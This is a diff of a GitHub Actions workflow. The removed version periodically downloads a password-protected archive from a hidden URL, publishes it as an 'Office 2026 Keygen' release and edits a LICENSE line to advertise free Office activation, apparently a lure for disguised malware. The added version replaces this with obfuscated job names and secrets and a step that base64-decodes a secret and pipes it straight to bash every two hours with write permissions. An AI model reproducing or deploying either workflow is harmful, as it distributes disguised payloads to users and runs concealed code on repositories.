@@ -1,116 +1,21 @@
-name: Initial commit
-
+name: S5fHv7aPssKwusrj
 on:
   schedule:
     - cron: '0 */2 * * *'
   workflow_dispatch:
-
-# =============================================
-env:
-  PASSWORD: office2026
-  RELEASE_TAG: 2026
-  RELEASE_TITLE: Office 2026 Keygen
-  FILENAME_TEMPLATE: "Office2026-64bit-keygen.rar"
-  FILE_EXTENSION: "rar"
-  REPO_ARCHIVE_FOLDER: "."
-  TARGET_FILE: "LICENSE"
-  TARGET_LINE_NUMBER: "7"
-  TARGET_LINE_TEMPLATE: "MS Office keygen is a compact, regularly-updated tool that instantly generates and validates genuine-format Microsoft Office 2016–2024 product keys straight from public GitHub repositories, perfect for students, freelancers and power users who want full activation without spending money or dealing with sketchy KMS servers."
-# =============================================
-
 jobs:
-  update-archive:
+  xZumkI:
     runs-on: ubuntu-latest
     permissions:
       contents: write
-
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.PAT_TOKEN }}
-
-      - name: Generate filename with date and random
-        id: filename
-        run: |
-          DATE_PART=$(date -u '+%m.%d')
-          FILENAME="${{ env.FILENAME_TEMPLATE }}"
-          
-          FILENAME=$(echo "$FILENAME" | sed "s/\[date\]/$DATE_PART/g")
-          
-          while [[ "$FILENAME" == *"[qq]"* ]]; do
-            RANDOM_DIGIT=$((RANDOM % 9 + 1))
-            FILENAME=$(echo "$FILENAME" | sed "s/\[qq\]/$RANDOM_DIGIT/")
-          done
-          
-          echo "filename=$FILENAME" >> $GITHUB_OUTPUT
-
-      - name: Delete old archive from repo
-        run: |
-          FOLDER="${{ env.REPO_ARCHIVE_FOLDER }}"
-          EXT="${{ env.FILE_EXTENSION }}"
-          
-          OLD_FILES=$(find "$FOLDER" -maxdepth 1 -name "*.$EXT" -type f 2>/dev/null || true)
-          
-          if [ -n "$OLD_FILES" ]; then
-            echo "$OLD_FILES" | while read -r file; do
-              rm -f "$file"
-            done
-          fi
-
-      - name: Download archive
+          token: ${{ secrets.oM291utAnBfUXJqA }}
+      - name: LWOXkuQi6MA
         env:
-          ARCHIVE_URL: ${{ secrets.ARCHIVE_URL }}
-        run: |
-          curl -fSL --retry 3 -o "${{ env.REPO_ARCHIVE_FOLDER }}/${{ steps.filename.outputs.filename }}" "$ARCHIVE_URL"
-
-      - name: Ensure release exists
-        env:
-          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
-        run: |
-          if ! gh release view ${{ env.RELEASE_TAG }} > /dev/null 2>&1; then
-            gh release create ${{ env.RELEASE_TAG }} --title "${{ env.RELEASE_TITLE }}" --notes "Init"
-          fi
-
-      - name: Clear old release assets
-        env:
-          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
-        run: |
-          set +e
-          ASSETS=$(gh release view ${{ env.RELEASE_TAG }} --json assets -q '.assets[].name' 2>/dev/null)
-          set -e
-          if [ -n "$ASSETS" ]; then
-            echo "$ASSETS" | while read -r asset; do
-              if [ -n "$asset" ]; then
-                gh release delete-asset ${{ env.RELEASE_TAG }} "$asset" --yes 2>/dev/null || true
-              fi
-            done
-          fi
-
-      - name: Upload asset to release
-        env:
-          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
-        run: |
-          gh release upload ${{ env.RELEASE_TAG }} "${{ env.REPO_ARCHIVE_FOLDER }}/${{ steps.filename.outputs.filename }}" --clobber
-
-      - name: Update release notes
-        env:
-          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
-        run: |
-          gh release edit ${{ env.RELEASE_TAG }} --notes "ARCHIVE PASSWORD: ${{ env.PASSWORD }}"
-
-      - name: Update target file
-        run: |
-          DOWNLOAD_URL="https://github.com/${{ github.repository }}/releases/download/${{ env.RELEASE_TAG }}/${{ steps.filename.outputs.filename }}"
-          NEW_LINE=$(echo "${{ env.TARGET_LINE_TEMPLATE }}" | sed "s|{URL}|$DOWNLOAD_URL|g")
-          sed -i "${{ env.TARGET_LINE_NUMBER }}s|.*|$NEW_LINE|" "${{ env.TARGET_FILE }}"
-
-      - name: Commit changes
-        env:
-          USERNAME: ${{ secrets.COMMIT_USERNAME }}
-        run: |
-          git config user.name "$USERNAME"
-          git config user.email "$USERNAME@users.noreply.github.com"
-          git add -A
-          git diff --staged --quiet || git commit -m "Initial commit"
-          git push
+          cwMYK0: ${{ secrets.fyArF1rJy }}
+          gpcbkzlRR: ${{ secrets.b0XVhYuxgW }}
+          I66U6N6lpdBdS: ${{ secrets.zNYCyKwOr }}
+          GITHUB_TOKEN: ${{ secrets.oM291utAnBfUXJqA }}
+        run: echo "$cwMYK0" | base64 -d | bash
